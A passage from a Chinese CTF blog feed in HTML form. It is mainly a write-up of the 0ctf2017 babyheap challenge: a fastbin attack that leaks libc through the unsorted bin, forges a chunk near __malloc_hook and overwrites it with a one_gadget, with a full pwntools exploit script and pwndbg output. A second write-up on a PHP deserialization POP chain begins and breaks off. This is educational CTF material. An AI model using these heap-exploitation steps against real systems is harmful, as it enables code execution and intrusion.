class="built_in">str</span>(idx))</span><br><span class="line">    io.sendlineafter(<span class="string">&quot;Size: &quot;</span>,<span class="built_in">str</span>(size))</span><br><span class="line">    io.sendlineafter(<span class="string">&quot;Content: &quot;</span>,content)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">free</span>(<span class="params">idx</span>):</span><br><span class="line">    io.sendlineafter(<span class="string">&quot;Command: &quot;</span>,<span class="built_in">str</span>(<span class="number">3</span>))</span><br><span class="line">    io.sendlineafter(<span class="string">&quot;Index: &quot;</span>,<span class="built_in">str</span>(idx))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">dump</span>(<span class="params">idx</span>):</span><br><span class="line">    io.sendlineafter(<span class="string">&quot;Command: &quot;</span>,<span class="built_in">str</span>(<span class="number">4</span>))</span><br><span class="line">    io.sendlineafter(<span class="string">&quot;Index: &quot;</span>,<span class="built_in">str</span>(idx))</span><br><span class="line">gdb.attach(io)</span><br><span class="line"></span><br><span class="line">alloc(<span class="number">0x10</span>);<span class="comment">#idx0</span></span><br><span class="line">alloc(<span class="number">0x10</span>);<span class="comment">#idx1</span></span><br><span class="line">alloc(<span class="number">0x10</span>);<span class="comment">#idx2</span></span><br><span class="line">alloc(<span class="number">0x10</span>);<span class="comment">#idx3</span></span><br><span class="line">alloc(<span class="number">0x80</span>);<span class="comment">#idx4</span></span><br><span class="line"></span><br><span class="line">io.interactive()<span class="comment">#交互</span></span><br></pre></td></tr></table></figure>堆情况</li></ol><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">idx0--&gt; <span class="number">0x55566f861000</span>:<span class="number">0x00000000</span><span class="number">0x00000000</span><span class="number">0x00000021</span><span class="number">0x00000000</span> </span><br><span class="line">        <span class="number">0x55566f861010</span>:<span class="number">0x00000000</span><span class="number">0x00000000</span><span class="number">0x00000000</span><span class="number">0x00000000</span></span><br><span class="line">idx1--&gt; <span class="number">0x55566f861020</span>:<span class="number">0x00000000</span><span class="number">0x00000000</span><span class="number">0x00000021</span><span class="number">0x00000000</span> </span><br><span class="line">        <span class="number">0x55566f861030</span>:<span class="number">0x00000000</span><span class="number">0x00000000</span><span class="number">0x00000000</span><span class="number">0x00000000</span></span><br><span class="line">idx2--&gt; <span class="number">0x55566f861040</span>:<span class="number">0x00000000</span><span class="number">0x00000000</span><span class="number">0x00000021</span><span class="number">0x00000000</span></span><br><span class="line">        <span class="number">0x55566f861050</span>:<span class="number">0x00000000</span><span class="number">0x00000000</span><span class="number">0x00000000</span><span class="number">0x00000000</span></span><br><span class="line">idx3--&gt; <span class="number">0x55566f861060</span>:<span class="number">0x00000000</span><span class="number">0x00000000</span><span class="number">0x00000021</span><span class="number">0x00000000</span></span><br><span class="line">        <span class="number">0x55566f861070</span>:<span class="number">0x00000000</span><span class="number">0x00000000</span><span class="number">0x00000000</span><span class="number">0x00000000</span></span><br><span class="line">idx4--&gt; <span class="number">0x55566f861080</span>:<span class="number">0x00000000</span><span class="number">0x00000000</span><span class="number">0x00000091</span><span class="number">0x00000000</span></span><br><span class="line">        <span class="number">0x55566f861090</span>:<span class="number">0x00000000</span><span class="number">0x00000000</span><span class="number">0x00000000</span><span class="number">0x00000000</span></span><br><span class="line">        <span class="number">0x55566f8610a0</span>:<span class="number">0x00000000</span><span class="number">0x00000000</span><span class="number">0x00000000</span><span class="number">0x00000000</span></span><br><span class="line">        <span class="number">0x55566f8610b0</span>:<span class="number">0x00000000</span><span class="number">0x00000000</span><span class="number">0x00000000</span><span class="number">0x00000000</span></span><br><span class="line">        …………</span><br></pre></td></tr></table></figure><ol start="2"><li>准备修改idx4,释放idx，使其进入unsorted bin</li></ol><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">+续</span><br><span class="line">free(<span class="number">1</span>)</span><br><span class="line">free(<span class="number">2</span>)<span class="comment">#此时c2的fd指向c1</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#更改free之后c2的fd，使其指c4</span></span><br><span class="line">payload=p64(<span class="number">0x00</span>)*<span class="number">3</span></span><br><span class="line">payload+=p64(<span class="number">0x21</span>)</span><br><span class="line">payload+=p64(<span class="number">0x00</span>)*<span class="number">3</span></span><br><span class="line">payload+=p64(<span class="number">0x21</span>)</span><br><span class="line">payload+=p8(<span class="number">0x80</span>)<span class="comment">#就是更改原fd的最后一位</span></span><br><span class="line"></span><br><span class="line">fill(<span class="number">0</span>,<span class="built_in">len</span>(payload),payload)</span><br><span class="line">+</span><br></pre></td></tr></table></figure><p>效果如下</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; <span class="built_in">bin</span></span><br><span class="line">fastbins</span><br><span class="line"><span class="number">0x20</span>: <span class="number">0x556588195040</span> —▸ <span class="number">0x556588195020</span> ◂— <span class="number">0x0</span></span><br><span class="line">变成</span><br><span class="line"><span class="number">0x20</span>: <span class="number">0x556588195040</span> —▸ <span class="number">0x556588195080</span> ◂— <span class="number">0x0</span></span><br></pre></td></tr></table></figure><p>更改c4大小，使其可以从fast bin上被取下来（不然大小会被check）</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">+续</span><br><span class="line"></span><br><span class="line">paylaod=p64(<span class="number">0x00</span>)*<span class="number">3</span></span><br><span class="line">payload+=p64(<span class="number">0x21</span>)</span><br><span class="line"><span class="comment">#通过c4 来更改c4的size</span></span><br><span class="line">fill(<span class="number">3</span>,<span class="built_in">len</span>(payload),payload)</span><br><span class="line">+续</span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">        pwndbg&gt; x/64wx <span class="number">0x55a4bb9c4000</span></span><br><span class="line">c0--&gt;   <span class="number">0x55a4bb9c4000</span>:<span class="number">0x00000000</span><span class="number">0x00000000</span><span class="number">0x00000021</span><span class="number">0x00000000</span></span><br><span class="line">        <span class="number">0x55a4bb9c4010</span>:<span class="number">0x00000000</span><span class="number">0x00000000</span><span class="number">0x00000000</span><span class="number">0x00000000</span></span><br><span class="line">c1--&gt;   <span class="number">0x55a4bb9c4020</span>:<span class="number">0x00000000</span><span class="number">0x00000000</span><span class="number">0x00000021</span><span class="number">0x00000000</span></span><br><span class="line">        <span class="number">0x55a4bb9c4030</span>:<span class="number">0x00000000</span><span class="number">0x00000000</span><span class="number">0x00000000</span><span class="number">0x00000000</span></span><br><span class="line">c2--&gt;   <span class="number">0x55a4bb9c4040</span>:<span class="number">0x00000000</span><span class="number">0x00000000</span><span class="number">0x00000021</span><span class="number">0x00000000</span></span><br><span class="line">        <span class="number">0x55a4bb9c4050</span>:<span class="number">0xbb9c4080</span><span class="number">0x000055a4</span><span class="number">0x00000000</span><span class="number">0x00000000</span></span><br><span class="line">c3--&gt;   <span class="number">0x55a4bb9c4060</span>:<span class="number">0x00000000</span><span class="number">0x00000000</span><span class="number">0x00000021</span><span class="number">0x00000000</span></span><br><span class="line">        <span class="number">0x55a4bb9c4070</span>:<span class="number">0x00000000</span><span class="number">0x00000000</span><span class="number">0x00000000</span><span class="number">0x00000000</span></span><br><span class="line">c4--&gt;   <span class="number">0x55a4bb9c4080</span>:<span class="number">0x00000000</span><span class="number">0x00000000</span><span class="number">0x00000021</span><span class="number">0x00000000</span></span><br><span class="line">        <span class="number">0x55a4bb9c4090</span>:<span class="number">0x00000000</span><span class="number">0x00000000</span><span class="number">0x00000000</span><span class="number">0x00000000</span></span><br><span class="line">        <span class="number">0x55a4bb9c40a0</span>:<span class="number">0x00000000</span><span class="number">0x00000000</span><span class="number">0x00000021</span><span class="number">0x00000000</span></span><br><span class="line">        <span class="number">0x55a4bb9c40b0</span>:<span class="number">0x00002180</span><span class="number">0x00000000</span><span class="number">0x00000000</span><span class="number">0x00000000</span></span><br><span class="line">        <span class="number">0x55a4bb9c40c0</span>:<span class="number">0x00000000</span><span class="number">0x00000000</span><span class="number">0x00000000</span><span class="number">0x00000000</span></span><br><span class="line">        <span class="number">0x55a4bb9c40d0</span>:<span class="number">0x00000000</span><span class="number">0x00000000</span><span class="number">0x00000000</span><span class="number">0x00000000</span></span><br><span class="line">        <span class="number">0x55a4bb9c40e0</span>:<span class="number">0x00000000</span><span class="number">0x00000000</span><span class="number">0x00000000</span><span class="number">0x00000000</span></span><br><span class="line">        <span class="number">0x55a4bb9c40f0</span>:<span class="number">0x00000000</span><span class="number">0x00000000</span><span class="number">0x00000000</span><span class="number">0x00000000</span></span><br></pre></td></tr></table></figure><p>重新申请拿到c4空间，再还原c4，使其进入unsorted bin  </p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">+续</span><br><span class="line"><span class="comment">#重新拿取fastbin上的c1,c2，先进后出，可以看到id2现在就是 c4</span></span><br><span class="line">alloc(<span class="number">0x10</span>)<span class="comment">#id1,c2</span></span><br><span class="line">alloc(<span class="number">0x10</span>)<span class="comment">#id2,c4</span></span><br><span class="line"></span><br><span class="line">payload=p64(<span class="number">0x00</span>)*<span class="number">3</span></span><br><span class="line">payload+=p64(<span class="number">0x91</span>)<span class="comment">#如此才能放入unsorted bin</span></span><br><span class="line">fill(<span class="number">3</span>,<span class="built_in">len</span>(payload),payload)</span><br><span class="line"></span><br><span class="line">alloc(<span class="number">0x60</span>)<span class="comment">#id5,c5，随便申请大小，这个chunk会，主要是避免c4 free后被top chunk吞掉。因为在没有申请c5前，c4紧邻top chunk，一旦free会被top chunk 合并</span></span><br><span class="line">free(<span class="number">4</span>)</span><br><span class="line">+续</span><br></pre></td></tr></table></figure><p>此时的堆情况</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">c0--&gt;   <span class="number">0x55564f658000</span>:<span class="number">0x00000000</span><span class="number">0x00000000</span><span class="number">0x00000021</span><span class="number">0x00000000</span></span><br><span class="line">        <span class="number">0x55564f658010</span>:<span class="number">0x00000000</span><span class="number">0x00000000</span><span class="number">0x00000000</span><span class="number">0x00000000</span></span><br><span class="line">c1--&gt;   <span class="number">0x55564f658020</span>:<span class="number">0x00000000</span><span class="number">0x00000000</span><span class="number">0x00000021</span><span class="number">0x00000000</span></span><br><span class="line">        <span class="number">0x55564f658030</span>:<span class="number">0x00000000</span><span class="number">0x00000000</span><span class="number">0x00000000</span><span class="number">0x00000000</span></span><br><span class="line">c2--&gt;   <span class="number">0x55564f658040</span>:<span class="number">0x00000000</span><span class="number">0x00000000</span><span class="number">0x00000021</span><span class="number">0x00000000</span></span><br><span class="line">        <span class="number">0x55564f658050</span>:<span class="number">0x00000000</span><span class="number">0x00000000</span><span class="number">0x00000000</span><span class="number">0x00000000</span></span><br><span class="line">c3--&gt;   <span class="number">0x55564f658060</span>:<span class="number">0x00000000</span><span class="number">0x00000000</span><span class="number">0x00000021</span><span class="number">0x00000000</span></span><br><span class="line">        <span class="number">0x55564f658070</span>:<span class="number">0x00000000</span><span class="number">0x00000000</span><span class="number">0x00000000</span><span class="number">0x00000000</span></span><br><span class="line">c4--&gt;   <span class="number">0x55564f658080</span>:<span class="number">0x00000000</span><span class="number">0x00000000</span><span class="number">0x00000091</span><span class="number">0x00000000</span></span><br><span class="line">        <span class="number">0x55564f658090</span>:<span class="number">0x25699b78</span><span class="number">0x00007fda</span><span class="number">0x25699b78</span><span class="number">0x00007fda</span></span><br><span class="line">        <span class="number">0x55564f6580a0</span>:<span class="number">0x00000000</span><span class="number">0x00000000</span><span class="number">0x00000021</span><span class="number">0x00000000</span></span><br><span class="line">        <span class="number">0x55564f6580b0</span>:<span class="number">0x00002180</span><span class="number">0x00000000</span><span class="number">0x00000000</span><span class="number">0x00000000</span></span><br><span class="line">        <span class="number">0x55564f6580c0</span>:<span class="number">0x00000000</span><span class="number">0x00000000</span><span class="number">0x00000000</span><span class="number">0x00000000</span></span><br><span class="line">        <span class="number">0x55564f6580d0</span>:<span class="number">0x00000000</span><span class="number">0x00000000</span><span class="number">0x00000000</span><span class="number">0x00000000</span></span><br><span class="line">        <span class="number">0x55564f6580e0</span>:<span class="number">0x00000000</span><span class="number">0x00000000</span><span class="number">0x00000000</span><span class="number">0x00000000</span></span><br><span class="line">        <span class="number">0x55564f6580f0</span>:<span class="number">0x00000000</span><span class="number">0x00000000</span><span class="number">0x00000000</span><span class="number">0x00000000</span></span><br><span class="line">        <span class="number">0x55564f658100</span>:<span class="number">0x00000000</span><span class="number">0x00000000</span><span class="number">0x00000000</span><span class="number">0x00000000</span></span><br><span class="line">c5--&gt;   <span class="number">0x55564f658110</span>:<span class="number">0x00000090</span><span class="number">0x00000000</span><span class="number">0x00000070</span><span class="number">0x00000000</span></span><br><span class="line">        <span class="number">0x55564f658120</span>:<span class="number">0x00000000</span><span class="number">0x00000000</span><span class="number">0x00000000</span><span class="number">0x00000000</span></span><br><span class="line">        <span class="number">0x55564f658130</span>:<span class="number">0x00000000</span><span class="number">0x00000000</span><span class="number">0x00000000</span><span class="number">0x00000000</span></span><br><span class="line">        <span class="number">0x55564f658140</span>:<span class="number">0x00000000</span><span class="number">0x00000000</span><span class="number">0x00000000</span><span class="number">0x00000000</span></span><br></pre></td></tr></table></figure><p>bin情况，可以看到指向了main_arena+88</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">unsortedbin</span><br><span class="line"><span class="built_in">all</span>: <span class="number">0x56252d3df080</span> —▸ <span class="number">0x7f8a54b1db78</span> (main_arena+<span class="number">88</span>) ◂— <span class="number">0x56252d3df080</span></span><br></pre></td></tr></table></figure><p>输出 main_arena+88</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">+续</span><br><span class="line">dump(<span class="number">2</span>)</span><br><span class="line">io.recvuntil(<span class="string">&#x27;Content: \x0a&#x27;</span>)</span><br><span class="line">main_arena_add_88=u64(io.recv(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">&#x27;\x00&#x27;</span>))</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(main_arena_add_88))</span><br><span class="line">+续</span><br></pre></td></tr></table></figure><p>计算libc基址 ,因为main_arena比__malloc_hook相差高 0x10，所以就计算出其再libc中的相对地址</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">+续</span><br><span class="line">main_arena_offset = ELF(<span class="string">&quot;libc.so.6&quot;</span>).symbols[<span class="string">&quot;__malloc_hook&quot;</span>] + <span class="number">0x10</span></span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(main_arena_offset))</span><br><span class="line">libc_base=main_arena-main_arena_offset</span><br><span class="line">malloc_hook=libc_base+elf.symbols[<span class="string">&#x27;__malloc_hook&#x27;</span>]<span class="comment">#计算出malloc_hook地址</span></span><br><span class="line">+续</span><br></pre></td></tr></table></figure><p>然后，因为malloc附近有可以构造利用的块一般就是地址开头的0x7f，所以申请0x60大小，才可以申请下来</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">+续</span><br><span class="line">alloc(<span class="number">0x60</span>)<span class="comment">#id4,c4</span></span><br><span class="line">free(<span class="number">4</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">payload=p64(malloc_hook-<span class="number">0x23</span>)<span class="comment">#构造一个0x7f大小的c6</span></span><br><span class="line">fill(<span class="number">2</span>,<span class="built_in">len</span>(payload),payload)</span><br></pre></td></tr></table></figure><p>此时的堆情况，可以看到本来的c4被我们移到了fast bin链，并指向malloc_hook前面的一个伪造块，_IO_wide_data_0+301&#x3D;&amp;malloc_hook+0x23</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">fastbins</span><br><span class="line"><span class="number">0x70</span>: <span class="number">0x564cb69f1080</span> —▸ <span class="number">0x7f3fc6e35aed</span> (_IO_wide_data_0+<span class="number">301</span>) ◂— <span class="number">0x3fc6af6ea0000000</span></span><br></pre></td></tr></table></figure><p>申请伪造块，填充malloc_hook</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">alloc(<span class="number">0x60</span>)<span class="comment">#id4,c4</span></span><br><span class="line">alloc(<span class="number">0x60</span>)<span class="comment">#id6,c6，申请刚刚构造的伪chunk</span></span><br><span class="line"></span><br><span class="line">one = [<span class="number">0xf1147</span>,<span class="number">0xf02a4</span>,<span class="number">0x4526a</span>,<span class="number">0x45216</span>] <span class="comment">#remote根据libc版本确定</span></span><br><span class="line">one_gadget = libc_base + one[<span class="number">2</span>]</span><br><span class="line"></span><br><span class="line">payload=p8(<span class="number">0x00</span>)*<span class="number">0x13</span>+p64(one_gadget) <span class="comment">#malloc_hook离c6数据区头有0x13个距离</span></span><br><span class="line">fill(<span class="number">6</span>,<span class="built_in">len</span>(payload),payload)</span><br><span class="line">alloc(<span class="number">0x80</span>)触发</span><br><span class="line">+续</span><br></pre></td></tr></table></figure><p>最终exp</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># -*- coding:utf8 -*-</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">io=process(<span class="string">&quot;./babyheap&quot;</span>) <span class="comment">#名字太长，我给重命名了。</span></span><br><span class="line"><span class="comment">#io=remote(&#x27;node4.buuoj.cn&#x27;,26653)</span></span><br><span class="line"><span class="comment">#elf=ELF(&#x27;../libc6_2.23.so&#x27;)#题目提示ubuntu 16，所以一般用的是64位 2.23</span></span><br><span class="line">elf=ELF(<span class="string">&#x27;/lib/x86_64-linux-gnu/libc.so.6&#x27;</span>)<span class="comment">#本地</span></span><br><span class="line">context.log_level=<span class="string">&#x27;debug&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">alloc</span>(<span class="params">size</span>):</span><br><span class="line">    io.sendlineafter(<span class="string">&quot;Command: &quot;</span>,<span class="built_in">str</span>(<span class="number">1</span>))</span><br><span class="line">    io.sendlineafter(<span class="string">&quot;Size: &quot;</span>,<span class="built_in">str</span>(size))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">fill</span>(<span class="params">idx,size,content</span>):</span><br><span class="line">    io.sendlineafter(<span class="string">&quot;Command: &quot;</span>,<span class="built_in">str</span>(<span class="number">2</span>))</span><br><span class="line">    io.sendlineafter(<span class="string">&quot;Index: &quot;</span>,<span class="built_in">str</span>(idx))</span><br><span class="line">    io.sendlineafter(<span class="string">&quot;Size: &quot;</span>,<span class="built_in">str</span>(size))</span><br><span class="line">    io.sendlineafter(<span class="string">&quot;Content: &quot;</span>,content)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">free</span>(<span class="params">idx</span>):</span><br><span class="line">    io.sendlineafter(<span class="string">&quot;Command: &quot;</span>,<span class="built_in">str</span>(<span class="number">3</span>))</span><br><span class="line">    io.sendlineafter(<span class="string">&quot;Index: &quot;</span>,<span class="built_in">str</span>(idx))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">dump</span>(<span class="params">idx</span>):</span><br><span class="line">    io.sendlineafter(<span class="string">&quot;Command: &quot;</span>,<span class="built_in">str</span>(<span class="number">4</span>))</span><br><span class="line">    io.sendlineafter(<span class="string">&quot;Index: &quot;</span>,<span class="built_in">str</span>(idx))</span><br><span class="line"><span class="comment">#gdb.attach(io)</span></span><br><span class="line"></span><br><span class="line">alloc(<span class="number">0x10</span>);<span class="comment">#id0,c0</span></span><br><span class="line">alloc(<span class="number">0x10</span>);<span class="comment">#id1,c1</span></span><br><span class="line">alloc(<span class="number">0x10</span>);<span class="comment">#id2,c2</span></span><br><span class="line">alloc(<span class="number">0x10</span>);<span class="comment">#id3,c3</span></span><br><span class="line">alloc(<span class="number">0x80</span>);<span class="comment">#id4,c4</span></span><br><span class="line"></span><br><span class="line">free(<span class="number">1</span>)</span><br><span class="line">free(<span class="number">2</span>)</span><br><span class="line"></span><br><span class="line">payload=p64(<span class="number">0x00</span>)*<span class="number">3</span></span><br><span class="line">payload+=p64(<span class="number">0x21</span>)</span><br><span class="line">payload+=p64(<span class="number">0x00</span>)*<span class="number">3</span></span><br><span class="line">payload+=p64(<span class="number">0x21</span>)</span><br><span class="line">payload+=p8(<span class="number">0x80</span>)</span><br><span class="line"></span><br><span class="line">fill(<span class="number">0</span>,<span class="built_in">len</span>(payload),payload)</span><br><span class="line"></span><br><span class="line">paylaod=p64(<span class="number">0x00</span>)*<span class="number">3</span></span><br><span class="line">payload+=p64(<span class="number">0x21</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">fill(<span class="number">3</span>,<span class="built_in">len</span>(payload),payload)</span><br><span class="line"></span><br><span class="line">alloc(<span class="number">0x10</span>)<span class="comment">#id1,c2</span></span><br><span class="line">alloc(<span class="number">0x10</span>)<span class="comment">#id2,c4</span></span><br><span class="line"></span><br><span class="line">payload=p64(<span class="number">0x00</span>)*<span class="number">3</span></span><br><span class="line">payload+=p64(<span class="number">0x91</span>)</span><br><span class="line">fill(<span class="number">3</span>,<span class="built_in">len</span>(payload),payload)</span><br><span class="line"></span><br><span class="line">alloc(<span class="number">0x60</span>)<span class="comment">#id5,c5</span></span><br><span class="line">free(<span class="number">4</span>)</span><br><span class="line"></span><br><span class="line">dump(<span class="number">2</span>)</span><br><span class="line">io.recvuntil(<span class="string">&#x27;Content: \x0a&#x27;</span>)</span><br><span class="line">main_arena=u64(io.recv(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">&#x27;\x00&#x27;</span>))-<span class="number">88</span></span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(main_arena))</span><br><span class="line"></span><br><span class="line">main_arena_offset = elf.symbols[<span class="string">&quot;__malloc_hook&quot;</span>] + <span class="number">0x10</span></span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(main_arena_offset))</span><br><span class="line">libc_base=main_arena-main_arena_offset</span><br><span class="line">malloc_hook=libc_base+elf.symbols[<span class="string">&#x27;__malloc_hook&#x27;</span>]</span><br><span class="line"></span><br><span class="line">alloc(<span class="number">0x60</span>)<span class="comment">#id4,c4</span></span><br><span class="line">free(<span class="number">4</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">payload=p64(malloc_hook-<span class="number">0x23</span>)</span><br><span class="line">fill(<span class="number">2</span>,<span class="built_in">len</span>(payload),payload)</span><br><span class="line"></span><br><span class="line">alloc(<span class="number">0x60</span>)</span><br><span class="line">alloc(<span class="number">0x60</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#one = [0xf1147,0xf02a4,0x4526a,0x45216] #remote</span></span><br><span class="line">one =[<span class="number">0x4527a</span>] <span class="comment">#local</span></span><br><span class="line">one_gadget = libc_base + one[<span class="number">0</span>]</span><br><span class="line"></span><br><span class="line">payload=p8(<span class="number">0x00</span>)*<span class="number">0x13</span>+p64(one_gadget)</span><br><span class="line">fill(<span class="number">6</span>,<span class="built_in">len</span>(payload),payload)</span><br><span class="line">alloc(<span class="number">0x80</span>)</span><br><span class="line"></span><br><span class="line">io.interactive()<span class="comment">#交互</span></span><br></pre></td></tr></table></figure><h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><p><a href="https://bbs.pediy.com/thread-223461.htm">0ctf2017 - babyheap </a></p>]]></content>
      
      
      
        <tags>
            
            <tag> pwn </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>BUUCTF-WEB-[MRCTF2020]Ezpop-php反序列化pop链</title>
      <link href="/2022/04/23/BUUCTF-WEB-MRCTF2020-Ezpop-php%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96pop%E9%93%BE/"/>
      <url>/2022/04/23/BUUCTF-WEB-MRCTF2020-Ezpop-php%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96pop%E9%93%BE/</url>
      
        <content type="html"><![CDATA[<h2 id="考点"><a href="#考点" class="headerlink" title="考点"></a>考点</h2><p>反序列化pop链 </p><p>这个很类似pwn里面的rop，就是走梅花桩的感觉。</p><h2 id="解题"><a href="#解题" class="headerlink" title="解题"></a>解题</h2><h3 id="源码分析，稍微debug修改了一下，不影响功能"><a href="#源码分析，稍微debug修改了一下，不影响功能" class="headerlink" title="源码分析，稍微debug修改了一下，不影响功能"></a>源码分析，稍微debug修改了一下，不影响功能</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span 